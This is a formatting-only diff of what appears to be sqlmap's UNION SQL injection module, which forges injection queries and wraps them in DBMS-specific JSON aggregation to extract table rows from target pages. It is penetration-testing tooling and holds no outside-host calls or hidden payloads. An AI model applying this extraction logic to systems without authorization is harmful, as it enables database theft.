@@ -62,8 +62,10 @@ from lib.utils.safe2bin import safecharencode
 from thirdparty import six
 from thirdparty.odict import OrderedDict
 
+
 def _oneShotUnionUse(expression, unpack=True, limited=False):
-    retVal = hashDBRetrieve("%s%s" % (conf.hexConvert or False, expression), checkConf=True)  # as UNION data is stored raw unconverted
+    retVal = hashDBRetrieve("%s%s" % (conf.hexConvert or False, expression),
+                            checkConf=True)  # as UNION data is stored raw unconverted
 
     threadData = getCurrentThreadData()
     threadData.resumed = retVal is not None
@@ -83,12 +85,14 @@ def _oneShotUnionUse(expression, unpack=True, limited=False):
             except IndexError:
                 pass
 
-            query = agent.forgeUnionQuery(injExpression, vector[0], vector[1], vector[2], vector[3], vector[4], vector[5], vector[6], None, limited)
+            query = agent.forgeUnionQuery(injExpression, vector[0], vector[1], vector[2], vector[3], vector[4],
+                                          vector[5], vector[6], None, limited)
             where = PAYLOAD.WHERE.NEGATIVE if conf.limitStart or conf.limitStop else vector[6]
         else:
             injExpression = unescaper.escape(expression)
             where = vector[6]
-            query = agent.forgeUnionQuery(injExpression, vector[0], vector[1], vector[2], vector[3], vector[4], vector[5], vector[6], None, False)
+            query = agent.forgeUnionQuery(injExpression, vector[0], vector[1], vector[2], vector[3], vector[4],
+                                          vector[5], vector[6], None, False)
 
         payload = agent.payload(newValue=query, where=where)
 
@@ -105,23 +109,27 @@ def _oneShotUnionUse(expression, unpack=True, limited=False):
         if kb.jsonAggMode:
             for _page in (page or "", (page or "").replace('\\"', '"')):
                 if Backend.isDbms(DBMS.MSSQL):
-                    output = extractRegexResult(r"%s(?P<result>.*)%s" % (kb.chars.start, kb.chars.stop), removeReflectiveValues(_page, payload))
+                    output = extractRegexResult(r"%s(?P<result>.*)%s" % (kb.chars.start, kb.chars.stop),
+                                                removeReflectiveValues(_page, payload))
                     if output:
                         try:
                             retVal = ""
                             fields = re.findall(r'"([^"]+)":', extractRegexResult(r"{(?P<result>[^}]+)}", output))
                             for row in json.loads(output):
-                                retVal += "%s%s%s" % (kb.chars.start, kb.chars.delimiter.join(getUnicode(row[field] or NULL) for field in fields), kb.chars.stop)
+                                retVal += "%s%s%s" % (kb.chars.start, kb.chars.delimiter.join(
+                                    getUnicode(row[field] or NULL) for field in fields), kb.chars.stop)
                         except:
                             retVal = None
                         else:
                             retVal = getUnicode(retVal)
                 elif Backend.isDbms(DBMS.PGSQL):
-                    output = extractRegexResult(r"(?P<result>%s.*%s)" % (kb.chars.start, kb.chars.stop), removeReflectiveValues(_page, payload))
+                    output = extractRegexResult(r"(?P<result>%s.*%s)" % (kb.chars.start, kb.chars.stop),
+                                                removeReflectiveValues(_page, payload))
                     if output:
                         retVal = output
                 else:
-                    output = extractRegexResult(r"%s(?P<result>.*?)%s" % (kb.chars.start, kb.chars.stop), removeReflectiveValues(_page, payload))
+                    output = extractRegexResult(r"%s(?P<result>.*?)%s" % (kb.chars.start, kb.chars.stop),
+                                                removeReflectiveValues(_page, payload))
                     if output:
                         try:
                             retVal = ""
@@ -140,7 +148,9 @@ def _oneShotUnionUse(expression, unpack=True, limited=False):
             def _(regex):
                 return firstNotNone(
                     extractRegexResult(regex, removeReflectiveValues(page, payload), re.DOTALL | re.IGNORECASE),
-                    extractRegexResult(regex, removeReflectiveValues(listToStrValue((_ for _ in headers.headers if not _.startswith(HTTP_HEADER.URI)) if headers else None), payload, True), re.DOTALL | re.IGNORECASE)
+                    extractRegexResult(regex, removeReflectiveValues(listToStrValue(
+                        (_ for _ in headers.headers if not _.startswith(HTTP_HEADER.URI)) if headers else None),
+                                                                     payload, True), re.DOTALL | re.IGNORECASE)
                 )
 
             # Automatically patching last char trimming cases
@@ -188,6 +198,7 @@ def _oneShotUnionUse(expression, unpack=True, limited=False):
 
     return retVal
 
+
 def configUnion(char=None, columns=None):
     def _configUnionChar(char):
         if not isinstance(char, six.string_types):
@@ -221,6 +232,7 @@ def configUnion(char=None, columns=None):
     _configUnionChar(char)
     _configUnionCols(conf.uCols or columns)
 
+
 def unionUse(expression, unpack=True, dump=False):
     """
     This function tests for an UNION SQL injection on the target
@@ -252,20 +264,32 @@ def unionUse(expression, unpack=True, dump=False):
         debugMsg += "it does not play well with UNION query SQL injection"
         singleTimeDebugMessage(debugMsg)
 
-    if Backend.getIdentifiedDbms() in (DBMS.MYSQL, DBMS.ORACLE, DBMS.PGSQL, DBMS.MSSQL, DBMS.SQLITE) and expressionFields and not any((conf.binaryFields, conf.limitStart, conf.limitStop, conf.forcePartial, conf.disableJson)):
+    if Backend.getIdentifiedDbms() in (
+    DBMS.MYSQL, DBMS.ORACLE, DBMS.PGSQL, DBMS.MSSQL, DBMS.SQLITE) and expressionFields and not any(
+            (conf.binaryFields, conf.limitStart, conf.limitStop, conf.forcePartial, conf.disableJson)):
         match = re.search(r"SELECT\s*(.+?)\bFROM", expression, re.I)
-        if match and not (Backend.isDbms(DBMS.ORACLE) and FROM_DUMMY_TABLE[DBMS.ORACLE] in expression) and not re.search(r"\b(MIN|MAX|COUNT)\(", expression):
+        if match and not (
+                Backend.isDbms(DBMS.ORACLE) and FROM_DUMMY_TABLE[DBMS.ORACLE] in expression) and not re.search(
+                r"\b(MIN|MAX|COUNT)\(", expression):
             kb.jsonAggMode = True
             if Backend.isDbms(DBMS.MYSQL):
-                query = expression.replace(expressionFields, "CONCAT('%s',JSON_ARRAYAGG(CONCAT_WS('%s',%s)),'%s')" % (kb.chars.start, kb.chars.delimiter, expressionFields, kb.chars.stop), 1)
+                query = expression.replace(expressionFields, "CONCAT('%s',JSON_ARRAYAGG(CONCAT_WS('%s',%s)),'%s')" % (
+                kb.chars.start, kb.chars.delimiter, expressionFields, kb.chars.stop), 1)
             elif Backend.isDbms(DBMS.ORACLE):
-                query = expression.replace(expressionFields, "'%s'||JSON_ARRAYAGG(%s)||'%s'" % (kb.chars.start, ("||'%s'||" % kb.chars.delimiter).join(expressionFieldsList), kb.chars.stop), 1)
+                query = expression.replace(expressionFields, "'%s'||JSON_ARRAYAGG(%s)||'%s'" % (
+                kb.chars.start, ("||'%s'||" % kb.chars.delimiter).join(expressionFieldsList), kb.chars.stop), 1)
             elif Backend.isDbms(DBMS.SQLITE):
-                query = expression.replace(expressionFields, "'%s'||JSON_GROUP_ARRAY(%s)||'%s'" % (kb.chars.start, ("||'%s'||" % kb.chars.delimiter).join("COALESCE(%s,' ')" % field for field in expressionFieldsList), kb.chars.stop), 1)
-            elif Backend.isDbms(DBMS.PGSQL):    # Note: ARRAY_AGG does CSV alike output, thus enclosing start/end inside each item
-                query = expression.replace(expressionFields, "ARRAY_AGG('%s'||%s||'%s')::text" % (kb.chars.start, ("||'%s'||" % kb.chars.delimiter).join("COALESCE(%s::text,' ')" % field for field in expressionFieldsList), kb.chars.stop), 1)
+                query = expression.replace(expressionFields, "'%s'||JSON_GROUP_ARRAY(%s)||'%s'" % (kb.chars.start, (
+                            "||'%s'||" % kb.chars.delimiter).join(
+                    "COALESCE(%s,' ')" % field for field in expressionFieldsList), kb.chars.stop), 1)
+            elif Backend.isDbms(
+                    DBMS.PGSQL):  # Note: ARRAY_AGG does CSV alike output, thus enclosing start/end inside each item
+                query = expression.replace(expressionFields, "ARRAY_AGG('%s'||%s||'%s')::text" % (kb.chars.start, (
+                            "||'%s'||" % kb.chars.delimiter).join(
+                    "COALESCE(%s::text,' ')" % field for field in expressionFieldsList), kb.chars.stop), 1)
             elif Backend.isDbms(DBMS.MSSQL):
-                query = "'%s'+(%s FOR JSON AUTO, INCLUDE_NULL_VALUES)+'%s'" % (kb.chars.start, expression, kb.chars.stop)
+                query = "'%s'+(%s FOR JSON AUTO, INCLUDE_NULL_VALUES)+'%s'" % (
+                kb.chars.start, expression, kb.chars.stop)
             output = _oneShotUnionUse(query, False)
             value = parseUnionPage(output)
             kb.jsonAggMode = False
@@ -275,12 +299,20 @@ def unionUse(expression, unpack=True, dump=False):
     # SQL limiting the query output one entry at a time
     # NOTE: we assume that only queries that get data from a table can
     # return multiple entries
-    if value is None and (kb.injection.data[PAYLOAD.TECHNIQUE.UNION].where == PAYLOAD.WHERE.NEGATIVE or kb.forcePartialUnion or conf.forcePartial or (dump and (conf.limitStart or conf.limitStop)) or "LIMIT " in expression.upper()) and " FROM " in expression.upper() and ((Backend.getIdentifiedDbms() not in FROM_DUMMY_TABLE) or (Backend.getIdentifiedDbms() in FROM_DUMMY_TABLE and not expression.upper().endswith(FROM_DUMMY_TABLE[Backend.getIdentifiedDbms()]))) and not re.search(SQL_SCALAR_REGEX, expression, re.I):
+    if value is None and (kb.injection.data[
+                              PAYLOAD.TECHNIQUE.UNION].where == PAYLOAD.WHERE.NEGATIVE or kb.forcePartialUnion or conf.forcePartial or (
+                                  dump and (
+                                  conf.limitStart or conf.limitStop)) or "LIMIT " in expression.upper()) and " FROM " in expression.upper() and (
+            (Backend.getIdentifiedDbms() not in FROM_DUMMY_TABLE) or (
+            Backend.getIdentifiedDbms() in FROM_DUMMY_TABLE and not expression.upper().endswith(
+            FROM_DUMMY_TABLE[Backend.getIdentifiedDbms()]))) and not re.search(SQL_SCALAR_REGEX, expression, re.I):
         expression, limitCond, topLimit, startLimit, stopLimit = agent.limitCondition(expression, dump)
 
         if limitCond:
             # Count the number of SQL query entries output
-            countedExpression = expression.replace(expressionFields, queries[Backend.getIdentifiedDbms()].count.query % ('*' if len(expressionFieldsList) > 1 else expressionFields), 1)
+            countedExpression = expression.replace(expressionFields,
+                                                   queries[Backend.getIdentifiedDbms()].count.query % (
+                                                       '*' if len(expressionFieldsList) > 1 else expressionFields), 1)
 
             if " ORDER BY " in countedExpression.upper():
                 _ = countedExpression.upper().rindex(" ORDER BY ")
@@ -378,7 +410,8 @@ def unionUse(expression, unpack=True, dump=False):
                                         if isListLike(items):
                                             # in case that we requested N columns and we get M!=N then we have to filter a bit
                                             if len(items) > 1 and len(expressionFieldsList) > 1:
-                                                items = [item for item in items if isListLike(item) and len(item) == len(expressionFieldsList)]
+                                                items = [item for item in items if
+                                                         isListLike(item) and len(item) == len(expressionFieldsList)]
                                             items = [_ for _ in flattenValue(items)]
                                             if len(items) > len(expressionFieldsList):
                                                 filtered = OrderedDict()
@@ -390,7 +423,8 @@ def unionUse(expression, unpack=True, dump=False):
                                             items = [items]
                                         index = None
                                         for index in xrange(1 + len(threadData.shared.buffered)):
-                                            if index < len(threadData.shared.buffered) and threadData.shared.buffered[index][0] >= num:
+                                            if index < len(threadData.shared.buffered) and \
+                                                    threadData.shared.buffered[index][0] >= num:
                                                 break
                                         threadData.shared.buffered.insert(index or 0, (num, items))
                                     else:
@@ -398,21 +432,31 @@ def unionUse(expression, unpack=True, dump=False):
                                         if threadData.shared.showEta:
                                             threadData.shared.progress.progress(threadData.shared.counter)
                                         for index in xrange(1 + len(threadData.shared.buffered)):
-                                            if index < len(threadData.shared.buffered) and threadData.shared.buffered[index][0] >= num:
+                                            if index < len(threadData.shared.buffered) and \
+                                                    threadData.shared.buffered[index][0] >= num:
                                                 break
                                         threadData.shared.buffered.insert(index or 0, (num, None))
 
-                                        items = output.replace(kb.chars.start, "").replace(kb.chars.stop, "").split(kb.chars.delimiter)
+                                        items = output.replace(kb.chars.start, "").replace(kb.chars.stop, "").split(
+                                            kb.chars.delimiter)
 
-                                    while threadData.shared.buffered and (threadData.shared.lastFlushed + 1 >= threadData.shared.buffered[0][0] or len(threadData.shared.buffered) > MAX_BUFFERED_PARTIAL_UNION_LENGTH):
+                                    while threadData.shared.buffered and (
+                                            threadData.shared.lastFlushed + 1 >= threadData.shared.buffered[0][
+                                        0] or len(threadData.shared.buffered) > MAX_BUFFERED_PARTIAL_UNION_LENGTH):
                                         threadData.shared.lastFlushed, _ = threadData.shared.buffered[0]
                                         if not isNoneValue(_):
                                             threadData.shared.value.extend(arrayizeValue(_))
                                         del threadData.shared.buffered[0]
 
-                                if conf.verbose == 1 and not (threadData.resumed and kb.suppressResumeInfo) and not threadData.shared.showEta and not kb.bruteMode:
-                                    _ = ','.join("'%s'" % _ for _ in (flattenValue(arrayizeValue(items)) if not isinstance(items, six.string_types) else [items]))
-                                    status = "[%s] [INFO] %s: %s" % (time.strftime("%X"), "resumed" if threadData.resumed else "retrieved", _ if kb.safeCharEncode else safecharencode(_))
+                                if conf.verbose == 1 and not (
+                                        threadData.resumed and kb.suppressResumeInfo) and not threadData.shared.showEta and not kb.bruteMode:
+                                    _ = ','.join("'%s'" % _ for _ in (
+                                        flattenValue(arrayizeValue(items)) if not isinstance(items,
+                                                                                             six.string_types) else [
+                                            items]))
+                                    status = "[%s] [INFO] %s: %s" % (
+                                    time.strftime("%X"), "resumed" if threadData.resumed else "retrieved",
+                                    _ if kb.safeCharEncode else safecharencode(_))
 
                                     if len(status) > width:
                                         status = "%s..." % status[:width - 3]
@@ -445,7 +489,8 @@ def unionUse(expression, unpack=True, dump=False):
     duration = calculateDeltaSeconds(start)
 
     if not kb.bruteMode:
-        debugMsg = "performed %d quer%s in %.2f seconds" % (kb.counters[PAYLOAD.TECHNIQUE.UNION], 'y' if kb.counters[PAYLOAD.TECHNIQUE.UNION] == 1 else "ies", duration)
+        debugMsg = "performed %d quer%s in %.2f seconds" % (
+        kb.counters[PAYLOAD.TECHNIQUE.UNION], 'y' if kb.counters[PAYLOAD.TECHNIQUE.UNION] == 1 else "ies", duration)
         logger.debug(debugMsg)
 
     return value
